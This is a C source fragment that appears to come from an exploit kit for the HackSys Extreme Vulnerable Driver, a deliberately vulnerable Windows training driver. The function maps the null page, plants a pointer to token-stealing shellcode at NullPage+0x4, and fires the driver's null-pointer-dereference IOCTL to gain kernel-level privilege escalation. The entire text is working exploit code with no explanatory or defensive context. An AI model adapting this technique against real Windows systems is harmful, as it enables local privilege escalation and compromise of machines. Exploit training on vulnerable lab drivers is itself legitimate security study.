DWORD WINAPI NullPointerDereferenceThread(LPVOID lpParameter) {
    HANDLE hFile = NULL;
    DWORD lpBytesReturned;
    PVOID nullPointer = NULL;
    ULONG magicValue = 0xBAADF00D;
    PVOID nullPageBaseAddress = NULL;
    LPCSTR lpFileName = (LPCSTR)DEVICE_NAME;
    PVOID pEopShellcode = &TokenStealingShellcodeWin7Generic;

    __try {
        DEBUG_MESSAGE("\t[+] Setting Thread Priority\n");

        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
            DEBUG_ERROR("\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n");
        }
        else {
            DEBUG_INFO("\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n");
        }

        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", lpFileName);

        hFile = GetDeviceHandle(lpFileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Mapping Null Page\n");

        if (!MapNullPage()) {
            DEBUG_ERROR("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }

        DEBUG_INFO("\t\t[+] Preparing Null Page Memory Layout\n");

        nullPointer = (PVOID)((ULONG)nullPageBaseAddress + 0x4);

        // now set the function pointer
        *(PULONG)nullPointer = (ULONG)pEopShellcode;

        DEBUG_INFO("\t\t\t[+] NullPage+0x4 Value: 0x%p\n", *(PULONG)nullPointer);
        DEBUG_INFO("\t\t\t[+] NullPage+0x4 Address: 0x%p\n", nullPointer);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", pEopShellcode);

        DEBUG_MESSAGE("\t[+] Triggering Null Pointer Dereference\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
                        (LPVOID)&magicValue,
                        0,
                        NULL,
                        0,
                        &lpBytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}